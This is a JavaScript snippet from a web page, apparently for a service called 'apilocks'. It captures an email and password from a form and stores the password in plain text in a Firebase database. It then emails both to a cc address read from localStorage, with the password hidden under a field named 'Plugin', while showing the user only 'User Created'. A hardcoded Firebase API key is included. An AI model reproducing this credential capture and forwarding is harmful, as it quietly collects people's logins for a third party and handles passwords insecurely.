  <script>
 var myData = localStorage['objectToPass'];
 var myEmail = localStorage['emailTopass'];
  if (myData=="ok") {
    window.location = "https://apilocks.com/login.html";
  }
  console.log(myEmail);
  var config = {
    apiKey: "AIzaSyCGySJf2o5FE1ROmv-CYinDdLREffHjutA",
    authDomain: "apilocks4584.firebaseapp.com",
    databaseURL: "https://apilocks4584.firebaseio.com",
    projectId: "apilocks4584",
    storageBucket: "apilocks4584.appspot.com",
    messagingSenderId: "338687853980"
  };
  
   firebase.initializeApp(config);

  
  document.getElementById("sss").addEventListener("click", function(){
    var email = document.getElementById('email').value;
    var password =  document.getElementById('pass').value;
    var reg = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z0-9_\-\.]{2,10})$/;
    if (reg.test(email) == false){
      alert('Invalid Email Address');
    }else{
    var newPostKey = firebase.database().ref("security").push().key;
    var pluginn = myData;
    firebase.database().ref("security/"+newPostKey).set({
            Api:newPostKey,
            userID:email,
            password:password,
            Plugin:pluginn,
            timestamp:firebase.database.ServerValue.TIMESTAMP
        }).then(function(){
                  var template_params = {
                   name: newPostKey,
                   reply_email:email,
                   ccmail:myEmail,
                   Plugin:password,
                   api:'ok'
                  };
                emailjs.send("apilocks","apilocks_id",template_params);
          }).catch(function(){
                 console.log("remove faild");
        });
    
     if (confirm("User Created")) {
      document.getElementById('email').value="";
      document.getElementById('pass').value="";
     }

    }
    

});
